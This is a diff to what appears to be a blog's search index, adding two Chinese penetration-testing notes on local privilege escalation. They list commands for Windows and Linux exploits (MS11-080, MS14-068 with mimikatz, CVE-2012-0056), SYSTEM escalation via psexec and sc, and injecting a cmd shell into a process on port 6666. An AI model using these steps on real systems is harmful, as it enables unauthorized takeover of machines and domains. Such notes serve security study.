@@ -71,7 +71,7 @@
           
           <category> 渗透测试 </category>
           
-          <category> 无线攻击 </category>
+          <category> 无线渗透 </category>
           
       </categories>
       
@@ -81,6 +81,64 @@
             <tag> Aircrack-ng </tag>
             
             <tag> 无线攻击 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>本地提权常见手法</title>
+      <link href="/2013/06/06/pentest/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/"/>
+      <url>/2013/06/06/pentest/%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E6%8F%90%E6%9D%83/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="利用漏洞提权windows"><a href="#利用漏洞提权windows" class="headerlink" title="利用漏洞提权windows"></a><strong>利用漏洞提权windows</strong></h3></blockquote><p><code>Ms11-080</code>        #此漏洞在中文版的系统中利用是DOS拒绝服务的攻击效果,而非提权</p><pre><code>Kb2592799    https://technet.microsoft.com/library/sevurity/ms11-080searchsploit Ms11-080exploits/windows/local/18176.py    Pyinstaller        #将python脚本编译为EXE需要用到的包    https://pypi.python.org/pypi/PyInstaller/2.1Pywin32            #将python脚本编译为EXE需要用到的扩展    http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/python pyinstaller.py --onefile 18176.py #将18176.py编译为exe可执行程序    MS11-046        #拒绝服务漏洞    DoSMs14-068        #普通用户提权到域服务器管理库    https://github.com/bidord/pykekms14-068.py -u user@lab.com -s userSID -d dc.lab.com拷贝 TGT_user1@lab.com.ccache 到windows系统本地管理员登录    mimikatz.exe log &quot;kerberos::ptc TGT_user@lab.com.ccache&quot; exit    dsa.msc        #域控制器管理</code></pre><blockquote><h3 id="利用漏洞提权linux"><a href="#利用漏洞提权linux" class="headerlink" title="利用漏洞提权linux"></a><strong>利用漏洞提权linux</strong></h3></blockquote><pre><code>Ubuntu 11.10    http://old-releases.ubuntu.com/releases/11.10gcc    sudo mount /dev/cdrom /media/cdrom    #挂载镜像    sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc    #把镜像加入安装源并安装GCC    gcc 18411.c -o expCVE-2012-0056    /proc/pid/mem    kernels&gt;=2.6.39    http://blog.zx2c4.com/749    scp /usr/share/exploitdb/platforms/linux/local/18411.c cat@192.168.1.118:/home/cat/        将利用脚本拷贝到目标机器</code></pre><blockquote><h3 id="利用配置不当提权"><a href="#利用配置不当提权" class="headerlink" title="利用配置不当提权"></a><strong>利用配置不当提权</strong></h3></blockquote><p>与系统漏洞提权相比,更常用的方法<br>企业环境<br>补丁更新的全部已经安装<br>输入变量过滤之外更值得研发关注的安全隐患<br>以system权限启动<br>NTFS权限允许users修改删除</p><p><code>icacls</code><br>    <code>icacls c:\windows\*.exe /save perm /T</code>    #快速查找windows系统中所有NTFS权限配置不当的程序<br>    <code>i586-mingw32msvc-gcc -o admin.exe admin.c</code>    #快速查找linux系统中所有NTFS权限配置不当的程序<br><code>Find</code><br>    <code>find / -perm 777 -exec ls -l {} \;</code></p><p>应用系统的配置文件<br>    应用连接数据库的配置文件<br>    后台服务运行账号</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 权限维持 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 漏洞提权 </tag>
+            
+            <tag> mimikatz </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>本地提权常见手法</title>
+      <link href="/2013/06/03/pentest/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/"/>
+      <url>/2013/06/03/pentest/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
+      
+        <content type="html"><![CDATA[<h3 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h3><p>已实现本地低权限账号登录<br>    远程溢出<br>    直接获得账号密码<br>希望获取更高权限<br>    实现对目标进一步控制<br>系统账号之间权限隔离<br>    操作系统安全的基础<br>    用户空间<br>    内核空间<br>系统账号<br>    用户账号登录时获取权限令牌<br>    服务账号无需用户登录已在后台启动服务</p><h5 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a><strong>Windows</strong></h5><pre><code>userAdministratorSystem    net user owl *        #修改密码    net user    #查看用户账号</code></pre><h5 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a><strong>Linux</strong></h5><pre><code>userRoot</code></pre><blockquote><h4 id="Administrator提权为SYSTEM"><a href="#Administrator提权为SYSTEM" class="headerlink" title="Administrator提权为SYSTEM"></a>Administrator提权为SYSTEM</h4></blockquote><p>Windows system账号<br>    系统设置管理功能<br>    SysInternal Suite<br>        <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/" target="_blank" rel="noopener">https://docs.microsoft.com/zh-cn/sysinternals/downloads/</a></p><pre><code>psexec -i -s -d taskmgrat 19:39 /interactive cmd    #win10已弃用at,改用sc和schtaskssc Create syscmd binPath=&quot;cmd /K start&quot; type=own type=interactsc start syscmd</code></pre><blockquote><h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4></blockquote><pre><code>隐蔽痕迹pinjector.exe    http://www.tarasco.org/security/Process_Injector/pinjector.exe -l    #查看可注入进程pinjecter.exe -p 3012 cmd 6666 #将CMD注入到PID为3012的进程,并开放端口6666</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 权限维持 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 提权 </tag>
+            
+            <tag> pinjector </tag>
             
         </tags>
       
